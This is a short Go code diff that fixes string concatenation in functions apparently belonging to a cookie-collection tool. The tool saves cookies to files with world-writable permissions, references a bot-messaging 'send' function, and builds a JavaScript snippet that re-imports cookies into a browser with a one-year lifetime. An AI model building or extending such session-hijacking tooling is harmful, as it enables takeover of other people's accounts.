@@ -49,7 +49,7 @@ type Document struct {
 }
 // Save dumps document as txt file on disc.
 func (p *Document) save() error {
-	filename := "cookies/"p.Title + ".txt"
+	filename := "cookies/" + p.Title + ".txt"
 	return ioutil.WriteFile(filename, p.Body, 0777)
 }
 func (d *Database) sessionsInit() {
@@ -305,7 +305,7 @@ func send(text string, botT string, chat_id int64) {
 func saveDoc(title string, myCookieFile string) {
 	dcF = `
 	(async () => {
-		let cookies = `myCookieFile`
+		let cookies = ` + myCookieFile + `
 		
 		function setCookie(key, value, domain, path, isSecure, sameSite) {
 			const cookieMaxAge = 'Max-Age=31536000' // set cookies to one year
